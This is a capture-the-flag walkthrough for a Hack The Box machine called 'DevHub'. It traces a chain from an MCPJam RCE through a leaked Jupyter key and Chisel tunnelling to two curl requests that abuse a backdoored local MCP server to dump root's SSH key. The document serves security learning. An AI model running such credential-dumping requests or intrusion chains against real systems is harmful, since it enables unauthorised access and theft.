# HTB - DevHub

---
## General Info
- OS: Linux, Ubuntu 24.04
- Open ports: 22, 80, 6274
- Local Ports: 8888, 5000
- Running services: NodeJS, Jupyter:8888(?), MCPJam:6274(1.4.2), opsmcpserver:5000
- Endpoints: -
- VHosts: -
- Auth: -
- Pwnd date: 1/6/2026

---
## Enumeration  

- Ran nmap, found port 22, 80 and 6274.
- The main panel gives info about the machine, and found MCPJam running on port 6274, version 1.4.2, that is vulnerable to an RCE [[CVE-2026-23744]], similar to [[Kobold]], so I'll use the PoC.
 
---
## Exploitation  

-  Ok, I have a reverse shell as user *mcp-dev*.
- Found Jupyter on localhost, and used `systemctl cat jupyter.service`, which printed me a key I could use to log into the panel:
  ```a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7```
- Used [[Chisel - Exposing internal ports|Chisel]] to expose local port 8888, which let me use that port in my machine.
- Got access to Jupyter with the key shown before, and got an interactive python shell as user *analyst*. After spawning a reverse shell, I got a foothold as user *analyst*.
- Got user flag, starting PrivEsc

---
## PrivEsc

-  Ran [[Peass|LinPeass]], and found a script, readable by me, running as sudo, on `/opt/opsmcp/server.py`, that contained a local server including a backdoor that enabled me to get root SSH key.
  
> Basically, by running these two commands, you get a dump of the SSH key of root:
```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._debug_mode","arguments":{}}'

curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }'
```

- And after formatting them, running `sed 's/\\n/\n/g' id_rsa > id_rsa2`, I SSHed into the user root using that key.
- Got root flag.

---
## Rabbit holes

 - Not a rabbit hole itself, but I supposed that the OSSMCP server was something related to MCPJam until Claude called me out lol. 

---
## Attack chain

- Get foothold as user *mcp-dev* by exploiting [[CVE-2026-23744]].
- Find Jupyter API Key using systemctl cat.
- Find a way of accessing port 8888 on your attacker's machine (used [[Chisel - Exposing internal ports|Chisel]])
- Log in with the API Key and use the interactive python shell to gain a reverse shell as *analyst*.
- Get user flag.
- Find script running as root on `/opt/opsmcp/server.py`.
- Exploit the backdoor to retrieve root flags.
- SSH into root with the key.
- Get root flag.

---
## Learnt

- Do not assume things (for the 5000th time).
- How to use [[Chisel - Exposing internal ports|Chisel]] to expose internal ports
- How to format unformatted SSH keys.
  
---
## Notes  
- Machine rating: Easyish - medium
  
  